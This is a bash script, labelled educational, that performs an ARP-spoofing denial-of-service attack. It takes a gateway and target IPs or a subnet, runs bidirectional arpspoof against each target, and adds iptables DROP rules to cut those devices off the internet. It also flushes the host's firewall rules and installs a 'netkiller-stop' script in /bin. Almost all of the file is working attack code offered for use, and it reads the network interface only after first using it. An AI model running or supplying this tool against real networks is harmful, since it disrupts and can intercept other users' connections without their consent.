#!/bin/bash

# ARP Spoofing Internet Blocker (Educational Purposes Only)
# Requires: arpspoof, iptables, ipcalc, and root privileges

echo "Enter Router Gateway IP:"
read -p "> " GATEWAY
echo "Enter Target IP(s) or (space-separated) Multi IP's or Subnet (10.0.0.1/20):"
read -p "> " TARGET_IPS

# Detect Device IP
echo "Enter Device IP: Enter to skip"
IP=$(ip addr show "$INTERFACE" | awk '/inet / {print $2}' | cut -d/ -f1)
read -p "> $IP" DEVIP
MYIP="${DEVIP:-$IP}"

echo "Enter Wifi Interface (wlan0):"
read -p "> " INTERFACE

# Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Flush all existing iptables rules
iptables -F
iptables -X
iptables -t nat -F

# Remove Iptables rules
cat > /bin/netkiller-stop << EOF
#!/bin/sh

iptables -F
iptables -X
iptables -t nat -F
pkill arpspoof
echo "Wifi clients connection are restored...!!!"
EOF
chmod 755 /bin/netkiller-stop

# Function to expand a subnet to individual IPs (using ipcalc)
expand_subnet() {
    SUBNET=$1
    IFS='/' read -r IP MASK <<< "$SUBNET"
    ipcalc -n -b "$SUBNET" | awk '/HostMin/ {start=$2} /HostMax/ {end=$2} END {if(start && end) print start, end}'
}

for TARGET in $TARGET_IPS; do
    if [[ "$TARGET" =~ / ]]; then
    
        # Expand subnet for ARP spoofing
        read HOSTMIN HOSTMAX < <(expand_subnet "$TARGET")
        if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
            # Convert IPs to integers
            ip2int() { local a b c d; IFS=. read -r a b c d <<< "$1"; echo "$((a*256**3 + b*256**2 + c*256 + d))"; }
            int2ip() { local ip=$1; echo "$((ip>>24&255)).$((ip>>16&255)).$((ip>>8&255)).$((ip&255))"; }
            START=$(ip2int $HOSTMIN)
            END=$(ip2int $HOSTMAX)
            for ((i=START; i<=END; i++)); do
                TARGET_IP=$(int2ip $i)
                (
                    # Block all the traffic except the device ip and gateway (bidirectional)
                    iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
                    iptables -I FORWARD ! -s "$GATEWAY" -d "$MYIP" -j DROP
        
                    arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
                    arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
                ) &
            done
        fi
    else
    (
        # Blocking traffic for Single IP
        iptables -I FORWARD -s "$TARGET" -d "$GATEWAY" -j DROP
        iptables -I FORWARD -s "$GATEWAY" -d "$TARGET" -j DROP

        # Bidirectional Arp Spoofing policy
        arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
        arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
    ) &
    fi
done
echo "Attacks are running in the background...!!!"
echo "Type: netkiller-stop to restore the wifi clients internet connection..."
